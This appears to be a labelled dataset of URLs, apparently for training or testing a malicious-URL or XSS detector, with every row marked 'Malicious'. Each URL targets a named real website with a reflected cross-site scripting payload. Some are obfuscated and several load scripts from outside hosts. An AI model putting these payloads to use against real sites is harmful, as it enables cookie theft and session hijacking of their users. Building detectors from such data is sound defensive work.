http://davao.da.gov.ph/mrdp/phpinfo.php?a[]=%3e%3cscript%3ealert(/kabus/);%3c/script%3e,Malicious
http://music.download.com/3603-5_32-0.html?fpt=3607&amp;tag=srch&amp;searchtype=3607&amp;qt=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;,Malicious
"http://guides.library.manoa.hawaii.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83)<br>)//\';alert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.<br>fromcharcode(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://www.vincmak.com/tr/galeri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.lgjobs.com/searches/reo6twv66vmre?kw=%22-%3e%3cscript%3ealert%28%2fxssed%2f%29%3c%2fscrip<br>t%3e&amp;order=desc&amp;sort=score,Malicious
http://www.snarf-it.org/pages/search.html?query=%3cscript%3ealert%28document.cookie%29%3b%3c%2fscrip<br>t%3e&amp;submit2=go%21,Malicious
http://search.mlive.com/sp?aff=100&amp;keywords=foobar%22%3e%3c/title%3e%3cscript%3ealert(/xssed/)%3c/sc<br>ript%3e%3c/head%3e!%3c--&amp;x=0&amp;y=0,Malicious
http://www.sahafium.com/goster/kisiler.asp?p=30&amp;cat=&amp;cas=&amp;pub=&amp;sid=719184552638&amp;ara=&amp;yer=&quot;&gt;&lt;script&gt;a<br>lert(document.cookie)&lt;/script&gt;,Malicious
http://www.devon.gov.uk/index.htm?textsize=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticx<br>s&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pc-koubou.jp/goods/search.php?s=75&amp;g=19&amp;c=50%22%3e'%3e%3cscript%3ealert('xss')%3c/script%<br>3e,Malicious
http://shopping.indiabigmall.com/v1/indian/catalogue.php?global_search=n&amp;keyword=%22%3e%3cscript%3ea<br>lert(%27cueballr%27)%3c/script%3e,Malicious
http://pbma.nasa.gov/index.php?fuseaction=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%<br>3e%3cmarquee%3e%3ch1%3exss%20by,Malicious
http://www.vodafone.com.gh/search-results.aspx?searchtext=%22%3cscript%3ealert%28%22xssed%22%29%3c%2<br>fscript%3e%22%3cscript%3ealert%28%22xssed%22%29%3c%2fscript%3e&amp;searchmode=allwords,Malicious
http://radio.foxnews.com/podcasts/gift_certificates.php?time=1347983787&step=4&item_number=fnr-cavutofbnm%27&term=1%20and%201=1&email=%22%3e%3cscript%3ealert%28/stronix/%29%3c/script%3e,Malicious
http://cep.lse.ac.uk/pubs/author.asp?author=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3e,Malicious
http://nhsc.ipac.caltech.edu/helpdesk/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabust<br>r.com/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(<br>document.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://www.highyieldliving.com/site/public/content.php?contentid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,Malicious
http://finditinyuma.com/results.php?search_menu=1&amp;keyword=%22%3e%3cscript%3ealert(document.cookie)%3<br>c/script%3e,Malicious
http://www.camarasaoleopoldo.rs.gov.br/index.php?pg=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/<br>thirdparty/scripts/python5.js%3e%3c/script%3e,Malicious
http://www.surfline.com/rss/rsscam.cfm?cam=trestlescam'&quot;&gt;&lt;/title&gt;&lt;script&gt;alert(1337)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;xss by xylitol&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://2.tool.ms/login.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.pyramidci.com/job/searching/ind/contract?phpmyadmin=sowhqquanuzuj1o5qyxhhfjgzh0&amp;country=i<br>ndia&amp;bread=2&amp;type=contract&amp;keyword=%27%22%3e/r0hit/%3e%3cscript%3ealert%28document.cookie%29%3c/scri<br>pt%3e%3ch1%3e%3cmarquee%3exss+by+rohit%3c%2fmarquee%3e%3c%2fh1%3e&amp;search=search&amp;option=search,Malicious
http://www.animenewsnetwork.com/encyclopedia/company.php?id=%22%3e%3cscript%3ealert('trex')%3c%2fscr<br>ipt%3e%3ch1%3ehacked+by+trex%3c%2fh1%3e,Malicious
http://www.costumeuniverse.com/search.asp?srkeys=%22%3e%3ciframe%20src=javascript:alert(123)%3e,Malicious
https://selfservis.superonlinetelekom.com/selfservice/jsp/loginfailed.jsp?loginpage=&quot;&gt;&lt;script&gt;alert(<br>'starext')&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,Malicious
http://www.opera-guide.ch/index.php?uilang=en%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
https://fungalgenomics.concordia.ca/feadb/genesearch.php?allspecies=%3cscript%3ealert(document.cooki<br>e);%3c/script%3e%2bares%2bapul%2bccin%2bclau%2bcele%2bgpan%2bgtra%2bledo%2blsco%2bopil%2bpchr%2bsthe<br>%2btlan%2btver&amp;sel_species%5b%5d=all&amp;gene_name=%22%3etesticles&amp;submit1=search#tlan,Malicious
http://www.dbwf-bowling.dk/galleri/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee<br>&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.totalbeauty.com/index.php?swords=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;x=0&amp;y=0&amp;id=51<br>&amp;no_cache=1,Malicious
http://www.meskiebru.com/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious
http://mail.sohu.com/?userid=&amp;appid=%27%22%3e%3cscript%3ealert%28123%29;%3c/script%3e%3c%22&amp;ru%20=,Malicious
http://www.originalskin.info/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.aim.com/remote/index.adp?aolp=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://w.n-w.jp/pc/support.php?flg=2c%00%22%22%3cscript%3ealert(123456789);%3c/script%3e,Malicious
http://mail01.mail.com/scripts/help/help.cgi?type=search&amp;lang=us&amp;string=%3c/title%3e%22%3e%3cscript%<br>3ealert('the_miller')%3c/script%3e&amp;type=text,Malicious
http://service.govdelivery.com/service/login.html?code=%22%3e%3cscript+src=http://starext.by.ru/lt.j<br>s%3e,Malicious
http://www.izto.org.tr/izto/templates/stable/calendar.aspx?formname=%22%3e%3c/script%3e%3cscript%3ea<br>lert(%22cyber-warrior.org%22)%3c/script%3e,Malicious
"https://www.ca-languedoc.fr/trouvez-une-agence-pres-de-chez-vous.html?address=/""><script>alert('xss by atm0n3r')</script>",Malicious
http://www.publicarclasificados.com/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdoor)&lt;/scrip<br>t&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.qzzx.gov.cn/seek.asp?seekstr=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://www.pubblicizzasito.net/search.php?what=%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%2<br>9%2f%2f%5c%27%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f%22%3balert%28string.fromcharc<br>ode%2888%2c83%2c83%29%29%2f%2f%5c%22%3balert%28string.fromcharcode%2888%2c83%2c83%29%29%2f%2f--%3e%3<br>c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2888%2c83%2c83%29%29%3c%2fscript%3e<br>&amp;search_top.x=0&amp;search_top.y=0&amp;search_top=go,Malicious
http://www.iut.univ-lille3.fr/~apreux/pmwiki/index.php?n=main.wikisandbox?from=%22/&gt;&lt;body<br>onload=alert(1)&gt;,Malicious
http://www.barclays.co.uk/insurance/home-insurance/?campaigncode=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1<br>&gt;hacked%20by%20trex&lt;/h1&gt;,Malicious
http://gos2.geodata.gov/wps/portal/gos/kcxml/04_sj9spykssy0xplmnmz0vm0y_qjzkl9443cnifsygyfpb6kehcfgg<br>hb31fj_zcvp0a_ylc0ihyr0vfabdazm0!/delta/base64xml/l3djdyevuud3qndnqsevnelvrs82x0xfsve!?command=searc<br>h&amp;what=%22%3e%3cscript%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_w<br>as_here%22%29%3cscript%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml<br>%3e%3chtml%3e%3cscript%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%252<br>0size%3d4%3e%3ctextarea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%<br>2520here%3c%2ftextarea%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e&amp;where=%22%3e%3cscrip<br>t%3ealert%281%29%3c%2fscript%3e%3c%2ftextarea%3e%3cscript%3ealert%28%22kaksii_was_here%22%29%3cscrip<br>t%3ealert%28%27kaksii_was_here%27%29%3balert%281%29%3c%2fscript%3e%22%3c%2fhtml%3e%3chtml%3e%3cscrip<br>t%3ealert%2810111%29%3c%2fscript%3e%3cdiv%2520align%3dcenter%3e%2520%3cfont%2520size%3d4%3e%3ctextar<br>ea%2520name%3d1%2520cols%3d100000%2520rows%3d10000%2520id%3d1%3ekaksii%2520was%2520here%3c%2ftextare<br>a%3e%3c%2ffont%3e%3c%2fdiv%3e%3cnoscript%3e%3cplaintext%3e,Malicious
http://www.enomcentral.com/inthenews.asp%3ch1%3exssed%20xssed%20xssed%20xssed%20xssed%20xssed%20xsse<br>d%20xssed%20xssed%20xssed%20xssed%20xssed%20%3c/h1%3e%3cscript%3ealert(%27hexspirit%27)%3c/script%3e,Malicious
http://www.dicle.edu.tr/index.php?orta=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/sc<br>ript%3e,Malicious
http://www.silgilikalem.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssed<br>bycicosz&quot;)&lt;/script&gt;,Malicious
http://www.powermark.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious
http://frh.utn.edu.ar/prueba/mysql_version.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][][][][]=&lt;script&gt;alert('/hola%20profe%20:d/');&lt;/script&gt;,Malicious
http://www.infoplease.com/biography.php3?fr=ipln&amp;waif=%27%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3<br>c%2fscript%3e&amp;go.x=4&amp;go.y=9,Malicious
http://www.diplomacy.edu/ig/igcbp/display.asp?topic=programme%22%3e%3cscript%3ealert(/pyske/)%3c/scr<br>ipt%3e,Malicious
http://www.scstatehouse.gov/php/contact.php?t=m&amp;c=1785227059--&gt;&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.coo<br>kie)&lt;/script&gt;&amp;,Malicious
http://www.target.com/s/189-2944812-4625749?_encoding=utf8&amp;search-alias=tgt-index&amp;keywords=&quot;&gt;&lt;/ifram<br>e&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious
http://www.eur.nl/zoeken/?q=%22%3e%3cscript%3ealert%28%2fkiller-tr+ownz%2f%29%3c%2fscript%3e,Malicious
https://www.donhr.navy.mil/search_index.asp?strsearchquery=%22%22%2f%2f%3e%3cscript%3ealert(document<br>.cookie)%3b%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+xados%3ch1%3e%3c%2fmarquee%3e&amp;action=search&amp;st<br>rtypeofsearch=w,Malicious
http://www.optimum.net/search?q=%22%3e'%3e%3cscript%3ealert(123)%3c%2fscript%3e%22',Malicious
http://www.googleearth4mac.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65<br>%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%<br>53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3e&amp;c=1&amp;p=1&amp;r=118688059<br>4051,Malicious
http://exporttochina.mofcom.gov.cn/wcne/search.php?country=greece%27%22%3e%3c/title%3e%3cscript%3eal<br>ert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
https://my.studentjobs.gov/login.asp?redirect=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%<br>3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/marquee%3e,Malicious
http://capricorn.anf.unf.edu/unftbo/shopcustadmin.asp?msg=%3cscript%3ealert('by%20codes%201923turk%2<br>0grup');%3c/script%3e,Malicious
http://www.kcclassifieds.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://freeriatools.adobe.com/flashbuilderproject/flexform.php?language=de%22%3e%3cscript%3ealert%2<br>8%22xss%22%29%3c/script%3e,Malicious
http://ms115.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.mlgpro.com/?q=node/219283&amp;page=&quot;&gt;&lt;/a&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;query=node/<br>219283,Malicious
http://www.liberal.org.au/?string=%22%3e%3cscript%3ealert(%22xssed!%22);%3c/script%3e&amp;action=informe<br>d,Malicious
http://www.tj.pb.gov.br/apps/goldendoc/index.aspx?appname=portal_quadro&amp;basename=%3cscript%3ealert(6<br>66)%3c/script%3e&amp;op=gotodoc&amp;id=65,Malicious
http://zulia.colciencias.gov.co/portalcol/kernel/usuario_externo_convocatoria/detalle_proceso.jsp?op<br>c=1&amp;id_proceso=360%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3c<br>h1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ehttp://www.contratos.gov.co/consultas/resultadolistado<br>procesos.jsp?entidad=117005003&amp;registrosxpagina=100&amp;paginaobjetivo=1&amp;desdefomulario=true%22%3e%3cscr<br>ipt%3ealert(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3<br>c/marquee%3ehttp://www.contratos.gov.co/consultas/resultadolistadoprocesos.jsp?entidad=117005003&amp;reg<br>istrosxpagina=100&amp;paginaobjetivo=1&amp;desdefomulario=true%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.spires.lipi.go.id/spires/find/hep/www?rawcmd=&quot;&gt;&lt;script&gt;alert(&quot;cyber-warrior.org&quot;)&lt;/script<br>&gt;,Malicious
http://www.teknolojicenneti.com/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script<br>&gt;,Malicious
http://asset.open.ru/themes/uknew/login.asp?folder=2391&amp;backpage=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mirabab.fr/envoyer_annonce_ami.php?ann=usine+cong%e9lation+de+po%3cscript%3ealert(0)%3c/s<br>cript%3eissons&amp;link=http://www.mirabab.fr/product_desc.php?id=7005,Malicious
http://softwarelist.de/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.watercoolinguk.co.uk/index.php?action=search&amp;keyword=%3c%252ftitle%3e%3ciframe+src%3d%22h<br>ttp%3a%2f%2fxssed.com%22%3e,Malicious
http://help.naver.com/service/svc_index.jsp?selected_nodeid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.basatder.com/foto_galeri/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://vbcity.com/forums/forum.asp?alias=&quot;&gt;&lt;img<br>src=&quot;http://img61.imageshack.us/img61/4632/26vrul2.jpg&quot;&gt;,Malicious
http://www.cologne-concert-brass.net/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marqu<br>ee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.utusan.com.my/utusan/keyword_search.asp?newstring=%22%3e%3cscript%3ealert%28document.title=%22centrinel%20was%20here%22%29%3c/script%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
http://www.hifinancialplanners.com/?page=companies&amp;id=1446&amp;name=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;<br>trex&lt;/h1&gt;,Malicious
"http://dk.trendmicro-europe.com/enterprise/vinfo/encyclopedia.php?vname=//--%3e%3c/script%3e%22%3e'%<br>3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,84,89,32,83,85,88))%3c/script%3e",Malicious
http://www.free-games.com.au/cgi-bin/search.cgi?query=%22%3e%27%3e%3cscript%3ealert(123)%3c/script%3<br>e,Malicious
http://www.oktoberfest.de/en/10/galerie.php?date=071004_ueberblick&amp;img=0%22%3e%3cscript%3ealert(23)%<br>3c/script%3e,Malicious
http://fish.cside.ne.jp/news1/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%20-%20unkn0wn.eu<br>%27%29%3c%2fscript%3e,Malicious
http://bitdefenderthailand.com/login.php?txtlogin=muhahaha&amp;txtpwd=meinpassword@address.com&amp;ref=%3e%2<br>2%3e%3cscript%20%0a%0d%3ealert(document.cookie)%3b%3c/script%3e,Malicious
http://www.cypack.com/customer/notice/viewform.html?seq=b1-20070830-0000016&amp;gubun=b2-20070807-000000<br>5&amp;page=1&amp;kw='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;kf=,Malicious
"http://www.lemonde.fr/web/recherche_resultats/1,13-0,1-0,0.html?query=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e&amp;periode=30&amp;x=10&amp;y=9&amp;dans=dansarticle&amp;num_page=1&amp;booleen=et&amp;ordre=pertinence&amp;<br>cat=multimedia",Malicious
http://www.tochio.net/yotakari/cgi-bin/topics/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%27ins%<br>20-%20unkn0wn.eu%27%29%3c%2fscript%3e,Malicious
http://developer.klocwork.com/register_thanks.php?email=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://forum.pricerunner.se/forum.jspa?forumid=%3c/script%3e%3ciframe%20src=javascript:alert(123)%3e,Malicious
http://www.luksus-poolhuse.dk/sommerhus-omraade.asp?sted=%22%3e%3cbody+onload=alert(%22by%20encore%2<br>2)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.hallandalebeach.org/index.asp?nid=-404&amp;badlink=/search.asp?searchstring=&quot;&gt;&lt;script&gt;alert(&quot;<br>bluemax&quot;)&lt;/script&gt;,Malicious
http://ainotane.sakura.ne.jp/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%<br>20kusomiso.com%22)%3c/script%3e,Malicious
http://www.esa.int/esa-mmg/mmg.pl?keyword=%22%3e%3cscript%3ealert(1)%3b%3c%2fscript%3e,Malicious
http://www.arl.army.mil/www/default.cfm?action=11&amp;page=outsidesource&amp;linktype=outside&amp;url=http://%22<br>/%3e%3c/a%3e%3c/%3e%3cimg%20src=1.gif%20onerror=alert(1337)%3e%3cmarquee%20bgcolor=%22red%22%3e%3ch1<br>%3exssby%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.blitzstart.dk/news_details.php?id=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3<br>e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://www.staffco.co.za/search_result.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.cortalconsors.lu/euroweblu/-?$event=snapshot&amp;$part=financeinfoshome.desks.stocks.desks.t<br>opflop.content.topflop.topflop-content.topflop-content-fr&amp;exchange=mil&amp;id=it0000072618&amp;id_name=isin%<br>20%27%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22);%3c/script%3e%3cmarquee%20bgcolor=%22red%22%3e%3<br>ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.arabicimagelibrary.com/lib/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
https://www.sandbox.paypal.com/nvpsm?amount=5.00&amp;currency_code=usd&amp;sender_country=&quot;&gt;&lt;script&gt;alert('x<br>ss')&lt;/script&gt;,Malicious
http://www.buildingsofireland.ie/niah/search.jsp?type=search&amp;county=%27%22%3e%3c/title%3e%3cscript%3<br>ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3ewi&amp;method=<br>advanced,Malicious
http://hk.dmz-plus.com/a-news.cgi?date=2007.11.30&amp;cal=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%<br>72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%3<br>1%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36<br>%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://messagebot.com/cgi-bin/list/add.cgi?email=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/scr<br>ipt%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.foia.cia.gov/browse_docs.asp?doc_no=0000579295&amp;title=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;,Malicious
http://www.zainab.org/zainabpix/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://locoboard.net/pass.php?mode=pass&amp;id=&amp;mail='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%<br>3e%3c/script%3e,Malicious
http://www.cwb.gov.tw/search-cgi/query_admin.exe?opcode=show_advance_search&amp;user=idquest&amp;tfile=cwb_a<br>dvance_search_form_en.html&amp;sfile=cwb_advance_search_single_entry_en.html%27%22%3e%3c/title%3e%3cscri<br>pt%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.kr-admin.gov.ua/search.php?words=%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.wehire.ca/personal.php?action=new&amp;auth_sess=e757d8719f17c4c88c41344fc1107ef6&amp;ref=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie);&lt;/script&gt;,Malicious
http://tdglobal.ksc.nasa.gov/servlet/search?field1=s%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/<br>script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3em_text&amp;text1=%27%22%3e%3c%<br>2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c<br>%2fmarquee%3e&amp;join1to2=and&amp;field2=sm_text&amp;text2=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2f<br>script%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;join2to3=and&amp;field3=sm_te<br>xt&amp;text3=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by<br>+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;max_results=100&amp;layup=standard,Malicious
http://stadtplan.portal.muenchen.de/muenchen/list.asp?sid=43d4e9c3d1d1ab6630f0f3c1c90591c2&amp;search=st<br>r&amp;city=m%fcnchen&amp;plz=&amp;str=%22%3e%3cscript%3ealert%28%22totalschaden%22%29%3c%2fscript%3e&amp;num=,Malicious
http://gamerzone.com.br/forum/redirector.php?url=%22%3e%3cscript%3ealert(2)%3c/script%3e,Malicious
http://www.keyworthy.com/keyword/rock+star+supernova%22%3e%3cscript%3ealert(document.cookie)%3c/scri<br>pt%3e,Malicious
http://tweetmeme.com/search.php?for=msg%27%22%3e%3cimg%20src=k.png%20onerror=alert(/xss/.source)%20/<br>%3e,Malicious
http://www.ask.com/videosmask?maskurl=http://www.xssed.com/archive/author=azat%20harutyunyan;&amp;o=&quot;&lt;sc<br>ript&gt;alert(&quot;xssed&quot;)&lt;/script&gt;&amp;l=dir,Malicious
https://directory.columbia.edu/people/search?filter.searchterm=%22'%3e%3cmarquee%3e%3ch1%3ecueballr%<br>3c/h1%3e%3c/marquee%3e,Malicious
http://www.kbs.com.au/business/cart/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-un<br>ity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://hope.6419.net/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://service.govdelivery.com/service/user.html?code=%22%3e%3cscript+src=http://starext.by.ru/lt.js<br>%3e,Malicious
http://www.pauletlea.com/achat/recherche.php?motclef=%22%3e%3cscript%3ealert(1337)%3c%2fscript%3e%3e<br>%3cmarquee%3e%3ch1%3exss+by+xerces%3c%2fh1%3e%3c%2fmarquee%3e&amp;imagefield3.x=0&amp;imagefield3.y=0,Malicious
http://www.aoa.gov/search/search.asp?q=http://www.americorps.gov/about/search/search_results.asp?str<br>searchwords=&lt;script&gt;alert(%22geewiz%22)&lt;/script&gt;,Malicious
http://www.newsroom.barclays.co.uk/search/default.asp?searchtext=%22%3e%3cscript%20src=http://ha.cke<br>rs.org/s.js%3e%3c/script%3e,Malicious
http://enterprise.vodafone.com/util/searchcms.do?sortby=relavance&amp;andcriteria=%22%3cscript%3ealert%2<br>8%22xssed%22%29%3c/script%3e%22%3cscript%3ealert%28%22xssed%22%29%3c/script%3e&amp;atleastoneof=&amp;without<br>these=&amp;booleancriteria=,Malicious
http://www.indirici.com/ara.asp?ara=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcot<br>icxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.scene.org/newfiles.php?dayint=7&dir=%22%3e%3cscript%3ealert%28document.cookie%29;%3c/script%3e,Malicious
http://www.excite.co.jp/bbs/blog/beginner/thread?mode=id&amp;t=1143553'%3e%22%3e%3cscript/src=http://kus<br>omiso.com/xss.js%3e%3c/script%3e&amp;m=1&amp;submit22=%95%5c%8e%a6,Malicious
